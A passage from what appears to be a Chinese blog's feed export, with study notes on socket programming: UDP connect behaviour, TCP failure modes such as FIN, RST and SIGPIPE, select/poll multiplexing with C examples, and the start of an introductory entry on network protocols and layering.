<span class="token function">inet_pton</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>server_addr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>        socklen_t server_len <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>server_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 将套接字和 IPv4 地址进行“绑定”，可能更好选择是 setpeername</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">connect</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>server_addr<span class="token punctuation">,</span> server_len<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"connect failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span>reply_addr<span class="token punctuation">;</span>    reply_addr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>server_len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> send_line<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">,</span> recv_line<span class="token punctuation">[</span>MAXLINE <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    socklen_t len<span class="token punctuation">;</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>send_line<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>send_line<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>send_line<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            send_line<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"now sending %s\n"</span><span class="token punctuation">,</span> send_line<span class="token punctuation">)</span><span class="token punctuation">;</span>        size_t rt <span class="token operator">=</span> <span class="token function">sendto</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> send_line<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>send_line<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>server_addr<span class="token punctuation">,</span> server_len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>rt <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"sendto failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"send bytes: %zu \n"</span><span class="token punctuation">,</span> rt<span class="token punctuation">)</span><span class="token punctuation">;</span>                len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        recv_line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        n <span class="token operator">=</span> <span class="token function">recvfrom</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> recv_line<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> reply_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"recvfrom failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        recv_line<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">fputs</span><span class="token punctuation">(</span>recv_line<span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>实验：不开启服务端的情况下开启客户端</p><p><img src="20220517-171430001.png" alt=""></p></li><li><p>一般来说，服务器端不会主动发起 connect 操作，因为一旦如此，服务器端就只能响应一个客户端，不过，有时候也不排除这样的情形</p></li></ul><p>​</p><p>​</p><h4 id="UDP-Connect-作用">UDP Connect 作用</h4><ul><li>对 UDP 套接字进行 connect 操作主要是为了让应用程序能够接收<strong>异步错误</strong>的信息</li><li>UDP 连接套接字不是发起连接请求的过程，而是记录<strong>目的地址和端口</strong>到套接字的<strong>映射关系</strong>，断开套接字则相反，将删除原来记录的映射关系</li><li>在服务器端不开启的情况下，不调用 connect 的客户端程序，是不会报错的，程序只会阻塞在 recvfrom 上，等待返回（或者超时）</li><li>如果调用 connect 将套接字建立了“上下文”，内核建立了 UDP 套接字 - 目的地址/端口之间的映射关系，当收到一个 ICMP 不可达报文时，内核可以从映射表中找出拥有该目的地址和端口的 UDP 套接字，当该套接字上再次调用 recvfrom 或 recv 时就可收到操作系统内核返回的 <code>Connection Refused</code> 信息</li><li>UDP 套接字允许多次 connect 操作<ul><li>可以重新指定新的 IP 地址和端口号</li><li>可以断开一个已连接的套接字，为了断开一个已连接的 UDP 套接字，第二次调用 connect 时，调用方需要把套接字地址结构的地址族成员设置为 <code>AF_UNSPEC</code></li></ul></li></ul><p>​</p><p>​</p><h4 id="收发函数">收发函数</h4><ul><li><p>在对 UDP 进行 connect 后收发函数的使用，很多书籍是这样推荐的：</p><ul><li><p>使用 send 或 write 函数来发送，如果使用 sendto 需要把相关的 to 地址信息置零</p></li><li><p>使用 recv 或 read 函数来接收，如果使用 recvfrom 需要把对应的 from 地址信息置零</p></li></ul></li><li><p>不同的 UNIX 实现对此表现出来的行为不尽相同</p><ul><li><p>在 Linux 4.4.0 环境中，使用 sendto 和 recvfrom，系统会自动忽略 to 和 from 信息</p></li><li><p>在 macOS 10.13 环境中，确实需要遵守这样的规定，使用 sendto 或 recvfrom 会得到一些奇怪的结果</p></li></ul></li></ul><p>​</p><p>​</p><h4 id="性能考虑">性能考虑</h4><ul><li><p>一般来说，客户端通过 connect 绑定服务端的地址和端口可以有一定程度的性能提升，因为连接套接字需要一定的开销</p><ul><li><p>如果不使用 connect 方式，每次发送报文的过程：连接套接字→发送报文→断开套接字→连接套接字→发送报文→断开套接字 →………</p></li><li><p>如果使用 connect 方式，每次发送报文的过程：连接套接字→发送报文→发送报文→……→断开套接字</p></li></ul></li></ul><p>​</p><p>​</p><h3 id="TCP-Failure-Modes">TCP Failure Modes</h3><ul><li><p>TCP 协议<strong>反映链路异常的能力偏弱</strong>，发送端并无法获取对应数据流的 ACK 情况，接收端也没有办法保证 ACK 过的数据部分可以被应用程序处理</p></li><li><p>TCP 连接建立之后，能感知 TCP 链路的方式是有限的，一种是以 read 为核心的读操作，另一种是以 write 为核心的写操作</p></li><li><p>故障模式总结</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220521-breakdown.png" alt=""></p><ul><li>对端无 FIN 包，需要通过巡检或超时来发现</li><li>对端有 FIN 包，需要通过增强 read 或 write 操作的异常处理</li></ul></li></ul><h4 id="对端无-FIN-包">对端无 FIN 包</h4><ul><li><p><strong>网络中断</strong>造成的对端无 FIN 包</p><ul><li><p>网络中断情况下 TCP 程序并不能及时感知到异常信息，除非网络中的其他设备，如路由器发出 ICMP 报文说明目的网络或主机不可达，如果程序是阻塞在 read 调用上则无法从异常中恢复</p><ul><li><p>可以通过给 read 操作设置超时来解决</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">timeval</span> tv<span class="token punctuation">;</span>tv<span class="token punctuation">.</span>tv_sec <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>tv<span class="token punctuation">.</span>tv_usec <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">// 设置套接字的读操作超时</span><span class="token function">setsockopt</span><span class="token punctuation">(</span>connfd<span class="token punctuation">,</span> SOL_SOCKET<span class="token punctuation">,</span> SO_RCVTIMEO<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>tv<span class="token punctuation">,</span> <span class="token keyword">sizeof</span> tv<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> nBytes <span class="token operator">=</span> <span class="token function">recv</span><span class="token punctuation">(</span>connfd<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nBytes <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>errno <span class="token operator">==</span> EAGAIN <span class="token operator">||</span> errno <span class="token operator">==</span> EWOULDBLOCK<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"read timeout\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">onClientTimeout</span><span class="token punctuation">(</span>connfd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"error read message"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>nBytes <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"client closed \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>可以添加对连接是否正常的<a href="#%E6%A3%80%E6%B5%8B%E8%BF%9E%E6%8E%A5%E7%8A%B6%E6%80%81">检测</a>，如果连接不正常就从当前 read 阻塞中返回并处理</p></li><li><p>利用多路复用技术自带的超时来完成对套接字 I/O 的检查，如果超过了预设的时间就进入异常处理</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">timeval</span> tv<span class="token punctuation">;</span>tv<span class="token punctuation">.</span>tv_sec <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>tv<span class="token punctuation">.</span>tv_usec <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token function">FD_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>allreads<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">FD_SET</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>allreads<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    readmask <span class="token operator">=</span> allreads<span class="token punctuation">;</span>    <span class="token comment">// 对套接字进行 I/O 事件的轮询</span>    <span class="token keyword">int</span> rc <span class="token operator">=</span> <span class="token function">select</span><span class="token punctuation">(</span>socket_fd <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>readmask<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>tv<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>rc <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"select failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>rc <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment">// 超时后的处理逻辑</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"read timeout\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">onClientTimeout</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>如果先调用 write 发送数据流再阻塞在 read 调用上，Linux 系统的 TCP 协议栈会不断尝试将发送缓冲区的数据发送出去，大概在重传 12 次后协议栈会标识该连接异常，这时，阻塞的 read 调用会返回一条 <code>TIMEOUT</code> 的错误信息</p><ul><li>如果此时程序还往连接写数据，写操作会立即失败，返回一个 SIGPIPE 信号给程序</li></ul></li></ul></li><li><p><strong>系统崩溃</strong>造成的对端无 FIN 包</p><ul><li><p>当系统突然崩溃（如断电），网络连接上来不及发出任何东西，在没有 ICMP 报文的情况下，TCP 程序只能通过 read 和 write 调用得到网络连接异常的信息，超时错误是一个常见的结果</p></li><li><p>系统在崩溃后又重启，当重传的 TCP 分组到达重启后的系统，由于系统中没有该 TCP 分组对应的连接数据，系统会返回一个 RST 重置分节，TCP 程序通过 read 或 write 调用可以分别对 RST 进行错误处理</p><ul><li><p>如果是阻塞的 read 调用，会立即返回一个错误，错误信息为连接重置 <code>Connection Resest</code></p></li><li><p>如果是 write 操作，也会立即失败，应用程序会被返回一个 SIGPIPE 信号</p></li></ul></li></ul></li></ul><p>​</p><p>​</p><h4 id="对端有-FIN-包">对端有 FIN 包</h4><ul><li><p>对端如果有 FIN 包发出，可能的场景是对端调用了 close 或 shutdown 显式地关闭了连接，也可能是对端应用程序崩溃，操作系统内核代为清理所发出的</p></li><li><p><strong>read 直接感知 FIN 包</strong></p><ul><li><p>read 操作在完成正常接收的数据读取之后，FIN 包会通过返回一个 EOF 来完成通知，此时 read 调用返回值为 0</p></li><li><p>收到 FIN 包之后 read 操作不会立即返回</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> nBytes <span class="token operator">=</span> <span class="token function">recv</span><span class="token punctuation">(</span>connfd<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>nBytes <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"error read message"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>nBytes <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"client closed \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong>通过 write 产生 RST，read 调用感知 RST</strong></p><ul><li><p>客户端正确显示了服务端的回应之后，再杀死服务器程序，客户端再次输入后出现 <code>peer connection closed</code></p></li><li><p>收到 FIN 包的客户端继续合法地向服务器端发送数据，服务器端在无法定位该 TCP 连接信息的情况下，发送了 RST 信息，当程序调用 read 操作时，内核会将 RST 错误信息通知给应用程序</p></li><li><p>在 Linux 4.4 内核上结果是内核正常将 EOF 信息通知给应用程序，而不是 RST 错误信息；Max OS 10.13.6 上 read 操作可以返回 RST 异常信息</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220526-failure-modes-fin.png" alt=""></p></li></ul></li><li><p><strong>向一个已关闭连接连续写导致 SIGPIPE</strong></p><ul><li><p>客户端在收到 FIN 包之后，没有 read 操作，还是会继续往这个套接字写入数据，当数据到达服务器端时，操作系统内核发现这是一个指向关闭的套接字，发送一个 RST 包给客户端</p><ul><li>因为根据 TCP 协议，连接是双向的，收到对方的 FIN 包只意味着<strong>对方不会再发送任何消息</strong>，在一个双方正常关闭的流程中，收到 FIN 包的一端将剩余数据发送给对面，然后关闭套接字</li></ul></li><li><p>Linux 4.4 内核上，客户端如果再执行 write 操作，会返回一个 RST 错误信息；Max OS 10.13.6 上客户端第二次操作时，应用程序会收到一个 SIGPIPE 信号，如果不捕捉这个信号，应用程序会在毫无征兆的情况下直接退出</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220526-failure-modes-fin-write.png" alt=""></p></li></ul></li></ul><h3 id="IO-多路复用（重点）">IO 多路复用（重点）</h3><ul><li>可以把标准输入、套接字等都看做 I/O 的一路，多路复用就是在任何一路 I/O 有事件发生的情况下，通知应用程序去处理相应的 I/O 事件，在同一时刻仿佛可以处理多个 I/O 事件</li></ul><h4 id="select">select</h4><ul><li><p>一种常见的 I/O 多路复用技术，使用 select 函数通知内核挂起进程，当一个或多个 I/O 事件发生后，控制权返还给应用程序，由应用程序进行 I/O 事件的处理</p></li><li><p>函数原型</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">select</span><span class="token punctuation">(</span><span class="token keyword">int</span> maxfd<span class="token punctuation">,</span> fd_set <span class="token operator">*</span>readset<span class="token punctuation">,</span> fd_set <span class="token operator">*</span>writeset<span class="token punctuation">,</span> fd_set <span class="token operator">*</span>exceptset<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">timeval</span> <span class="token operator">*</span>timeout<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">timeval</span> <span class="token punctuation">{</span>  <span class="token keyword">long</span>   tv_sec<span class="token punctuation">;</span> <span class="token comment">/* seconds */</span>  <span class="token keyword">long</span>   tv_usec<span class="token punctuation">;</span> <span class="token comment">/* microseconds */</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>maxfd</code> 表示待测试的描述符基数，值是待测试的最大描述符 +1</li><li>读描述符集合 <code>readset</code>、写描述符集合 <code>writeset</code> 和异常描述符集合 <code>exceptset</code>，这三个描述符集合分别通知内核，在哪些描述符上检测数据可以读，可以写和有异常发生<ul><li>每一个都可以设置成空，表示不需要内核进行相关的检测</li></ul></li><li><code>timeval</code> 结构体时间<ul><li>设置成空 (NULL)，表示如果没有 I/O 事件发生，则 select 一直等待</li><li>设置一个非零的值，表示等待固定的一段时间后从 select 阻塞调用中返回</li><li><code>tv_sec</code> 和 <code>tv_usec</code> 都设置成 0，表示不等待，检测完毕立即返回（使用较少）</li></ul></li><li>返回：若有就绪描述符则为其数目，若超时则为 0，若出错则为 -1</li></ul></li><li><p>设置描述符集合</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">FD_ZERO</span><span class="token punctuation">(</span>fd_set <span class="token operator">*</span>fdset<span class="token punctuation">)</span><span class="token punctuation">;</span>　　　　　　<span class="token keyword">void</span> <span class="token function">FD_SET</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> fd_set <span class="token operator">*</span>fdset<span class="token punctuation">)</span><span class="token punctuation">;</span>　　<span class="token keyword">void</span> <span class="token function">FD_CLR</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> fd_set <span class="token operator">*</span>fdset<span class="token punctuation">)</span><span class="token punctuation">;</span>　　　<span class="token keyword">int</span>  <span class="token function">FD_ISSET</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> fd_set <span class="token operator">*</span>fdset<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>FD_ZERO</code> 用来将描述符集合所有元素都设置成 0（0 代表不需要处理，1 代表需要处理）</li><li><code>FD_SET</code> 用来把对应套接字 fd 的元素 a[fd] 设置成 1</li><li><code>FD_CLR</code> 用来把对应套接字 fd 的元素 a[fd] 设置成 0</li><li><code>FD_ISSET</code> 对向量进行检测，判断出对应套接字元素 a[fd] 的值</li></ul></li><li><p>套接字描述符就绪条件</p><p>当我们说 select 测试返回，某个套接字准备好可读，表示什么样的事件发生呢？</p><p>第一种情况是套接字接收缓冲区有数据可以读，如果我们使用 read 函数去执行读操作，肯定不会被阻塞，而是会直接读到这部分数据。</p><p>第二种情况是对方发送了 FIN，使用 read 函数执行读操作，不会被阻塞，直接返回 0。</p><p>第三种情况是针对一个监听套接字而言的，有已经完成的连接建立，此时使用 accept 函数去执行不会阻塞，直接返回已经完成的连接。</p><p>第四种情况是套接字有错误待处理，使用 read 函数去执行读操作，不阻塞，且返回 -1。</p><p>总结成一句话就是，内核通知我们套接字有数据可以读了，使用 read 函数不会阻塞。</p><p>不知道你是不是和我一样，刚开始理解某个套接字可写的时候，会有一个错觉，总是从应用程序角度出发去理解套接字可写，我开始是这样想的，当应用程序完成相应的计算，有数据准备发送给对端了，可以往套接字写，对应的就是套接字可写。</p><p>其实这个理解是非常不正确的，select 检测套接字可写，<strong>完全是基于套接字本身的特性来说</strong>的，具体来说有以下几种情况。</p><p>第一种是套接字发送缓冲区足够大，如果我们使用非阻塞套接字进行 write 操作，将不会被阻塞，直接返回。</p><p>第二种是连接的写半边已经关闭，如果继续进行写操作将会产生 SIGPIPE 信号。</p><p>第三种是套接字上有错误待处理，使用 write 函数去执行读操作，不阻塞，且返回 -1。</p><p>总结成一句话就是，内核通知我们套接字可以往里写了，使用 write 函数就不会阻塞。</p></li></ul><h4 id="poll">poll</h4><ul><li><p>函数原型</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">poll</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pollfd</span> <span class="token operator">*</span>fds<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> nfds<span class="token punctuation">,</span> <span class="token keyword">int</span> timeout<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h3 id="非阻塞-I-O">非阻塞 I/O</h3><ul><li>编程语言的 I/O 模型是通过抽象和设计，总结出的一套规范</li></ul><blockquote><p>未完待续</p></blockquote><h2 id="参考-3">参考</h2><ul><li><a href="https://zh.m.wikipedia.org/zh-hans/%E4%BF%9D%E7%95%99IP%E5%9C%B0%E5%9D%80">保留IP地址</a></li><li><a href="https://shuangxunian.github.io/2021/06/13/TCPInterviewQuestions/">TCP面试题</a></li><li><a href="https://jaminzhang.github.io/dns/The-Reason-of-There-Is-Only-13-DNS-Root-Servers/">只有 13 台 DNS 根域名服务器原因</a></li><li><a href="https://blog.csdn.net/wdscq1234/article/details/52432095">TCP-IP详解：Nagle算法</a></li><li><a href="https://switch-router.gitee.io/blog/reuseport/">Linux 内核中 reuseport 的演进</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计科 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
            <tag> 网络协议 </tag>
            
            <tag> 网络编程 </tag>
            
            <tag> socket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络协议基础入门</title>
      <link href="2021/02/04/cs-network-protocol/"/>
      <url>2021/02/04/cs-network-protocol/</url>
      
        <content type="html"><![CDATA[<h1>前言</h1><p><strong>看似最枯燥、最基础的东西往往具有最长久的生命力</strong></p><p>​</p><p>​</p><h2 id="网络协议">网络协议</h2><ul><li><p>网络协议（Network Protocol），简称为协议，是为进行网络中的数据交换而建立的规则、标准或约定</p></li><li><p>Internet 中涉及两个或多个通信远程实体的所有活动都由协议管理，协议规范了网络中所有信息发送和接收过程</p></li><li><p>协议规定了通信实体之间所交换消息的<strong>格式、意义、顺序</strong>以及针对收到信息或发生的事件所采取的<strong>动作</strong></p><blockquote><p><em>A protocol defines the format and the order of messages exchanged between two or more communicating entities, as well as the actions taken on the transmission and/or receipt of a message or other event.</em></p></blockquote></li></ul><h3 id="协议三要素">协议三要素</h3><ul><li>语法（<strong>Syntax</strong>）<ul><li>数据与控制信息的结构或格式</li><li>信号电平</li></ul></li><li>语义（<strong>Semantics</strong>）<ul><li>需要发出何种控制信息</li><li>完成何种动作以及做出何种响应</li></ul></li><li>时序（<strong>Timing</strong>）<ul><li>事件顺序</li><li>速度匹配</li></ul></li></ul><p>​</p><p>​</p><h2 id="网络分层">网络分层</h2><ul><li><a href="https://night-candle.github.io/2021/02/04/cs-network-socket/#OSI-%E7%BD%91%E7%BB%9C%E5%88%86%E5%B1%82%E6%A8%A1%E5%9E%8B">OSI 概念模型</a></li><li>OSI 与 TCP/IP 模型对照</li></ul><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210522-network-model.png" style="zoom: 80%;"><ul><li><p>网络分层的优点：</p><ul><li><p>各层之间是独立的，某一层并不需要知道它下一层是如何实现的，而仅仅需要知道该层通过层间的接口所提供的服务</p></li><li><p>灵活性好，当任何一层发生变化时，只要<strong>层间接口关系保持不变，则在这层以上或以下各层均不受影响</strong></p><blockquote><p>传输层是 IPv4 或 IPv6，链路层是否仍使用1500字节的 MTU 对应用层没有影响</p><p><a href="https://www.dpdk.org/">Intel DPDK</a> 绕过了内核网络协议栈，提供了更好的网络性能，但一些调试工具也因此无法使用</p></blockquote></li><li><p>结构上可分割开、易于实现和维护、能促进标准化工作</p></li></ul></li><li><p>层与层的关系：<strong>只要是在网络上的包都是完整的，可以有下层没上层，但不可有上层没下层</strong>，无论这个包经过哪些设备，它都是完整的，所谓二层设备、三层设备，都是这些设备上跑的程序不同而已，一个 HTTP 